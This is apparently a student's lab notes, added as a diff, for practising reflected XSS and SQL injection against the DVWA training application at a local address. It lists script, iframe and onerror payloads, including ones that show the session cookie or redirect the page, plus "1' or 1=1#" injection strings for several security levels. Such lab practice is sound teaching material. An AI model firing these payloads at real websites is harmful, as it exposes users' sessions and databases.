@@ -1,0 +1,49 @@
+XSS and SQL Injection attack
+
+
+a)Visit website 192.168.2.2 and click on dvwa
+2)Click on Create/Reset Database.
+3)username - admin , password - password and login
+
+performing XSS attack DVWA Security
+For Security Level Low
+
+DVWA Security -- security level > low and submit
+Go to XSS(Reflected)
+1)Type the code     <script>alert("Your data is at risk")</script>
+then submit
+
+2)Show cookie session value of document
+<script>alert(document.cookie)</script>
+
+3) Redirect user to some malicious site
+<script>window.location="http://testphp.vulnweb.com/login.php"</script>
+
+4)Create a script to extract the absolute URI of website
+<script>alert(document.baseURI)</script>
+
+5)show an error as hacked when try to accessed unknow image
+<img src=abc.jpeg onerror=alert("Hacked")>
+6)
+<iframe src="http://testphp.vulnweb.com/""></iframe>
+
+For Security Level Medium
+DVWA Security set to medium
+<script>alert("Your DATA IS AT RISK")</script>
+
+
+SQL INJECTION
+Security level:low
+
+Go SQL Injection and type
+1' or 1=1#
+
+Security level:Medium
+DVWA security to medium
+Go to SQL Injection and type 
+2
+
+Security level:High
+DVWA security to High
+Go to SQL Injection and type 
+1' or 1=1#
